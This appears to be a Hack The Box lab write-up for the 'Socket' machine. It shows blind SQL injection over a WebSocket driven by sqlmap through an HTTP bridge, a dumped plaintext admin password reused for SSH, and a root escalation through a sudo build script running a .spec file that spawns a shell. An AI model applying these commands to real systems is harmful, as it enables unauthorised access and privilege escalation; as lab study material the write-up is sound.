---
layout: post
title: "HTB: Socket"
subtitle: "blind SQLi over a Python WebSocket for admin creds, password reuse to SSH, then a sudo pyinstaller spec for root"
date: 2023-04-05
tags: [htb, linux, websocket-sqli, password-reuse, pyinstaller]
category: writeups
kind: machine
tldr: "The QReader app on ws.qreader.htb:5789 ran a Python websockets server with a blind SQL injection, dumping admin:denjanjade122566. That password was reused for tkeller over SSH. Root came from a sudo build-installer.sh that runs pyinstaller on an attacker-supplied .spec file, which executes arbitrary Python as root."
---

## the box

Socket is an Ubuntu box running OpenSSH 8.9p1 on 22, Apache 2.4.52 fronting a Werkzeug 2.1.2 / Python 3.10.6 app on 80, and a Python `websockets` server on 5789. The site distributes a desktop app, QReader, that talks to the WebSocket backend.

## recon

nmap fingerprinted 5789 as a websockets server:

```
5789/tcp open  Server: Python/3.10 websockets/10.4
Failed to open a WebSocket connection: did not receive a valid HTTP request.
```

The QReader client pointed at `ws://ws.qreader.htb:5789` and called two endpoints, `/version` and `/update`, sending a JSON `version` field. The binary was a PyInstaller 5.6.2 bundle, so I unpacked it with `pyinstxtractor` and decompiled the resulting `qreader.pyc` with `pycdc`, which confirmed the host and message shape:

```python
ws_host = 'ws://ws.qreader.htb:5789'
response = asyncio.run(ws_connect(ws_host + '/version', json.dumps({'version': VERSION})))
```

## foothold

The `version` value flowed into a SQLite query and was injectable, but the only feedback was the response body, so this was blind SQLi over the WebSocket. As with similar boxes, I bridged WebSocket to HTTP with a small middleware so sqlmap could drive it. The middleware sends my payload as the version field:

```python
ws_server = "ws://ws.qreader.htb:5789/version"
data = '{"version":"%s"}' % message
```

Run the middleware, then point sqlmap at the local endpoint:

```bash
python3 exp.py
# [+] Send payloads in http://localhost:8081/?id=*
sqlmap -u "http://127.0.0.1:8081/?id=1" --batch --dump
```

That recovered admin credentials:

```
admin:denjanjade122566
```

## user

The Mattermost-style content and the team page suggested other usernames (json, tkeller, kthomas, thomask, mike). The admin password was reused, and it logged in over SSH as `tkeller`:

```bash
ssh tkeller@10.10.11.206
# tkeller:denjanjade122566
```

tkeller held the user flag.

## root

`sudo -l` allowed a build script as root:

```
(root) NOPASSWD: /usr/local/sbin/build-installer.sh
```

The script takes an action and a filename. With action `build` and a `.spec` extension it runs pyinstaller directly on the file:

```bash
if [[ $action == 'build' ]]; then
  if [[ $ext == 'spec' ]] ; then
    /home/svc/.local/bin/pyinstaller $name
```

A pyinstaller `.spec` file is just Python that pyinstaller executes at build time, so I put a shell escape in it:

```bash
echo 'import os; os.system("/bin/sh")' > pwn.spec
sudo /usr/local/sbin/build-installer.sh build pwn.spec
```

pyinstaller imported the spec and ran my code as root:

```
122 INFO: PyInstaller: 5.6.2
# whoami
root
```

That shell owned the root flag.

## takeaway

Two patterns drive this box. First, SQL injection hidden behind a WebSocket, exploited by fronting it with an HTTP middleware so an off-the-shelf tool works. Second, password reuse turning one dumped credential into SSH access. The root step is a reminder that build-tool config files are code: a sudo rule that runs pyinstaller on a user-supplied `.spec` is the same as a sudo rule that runs arbitrary Python.
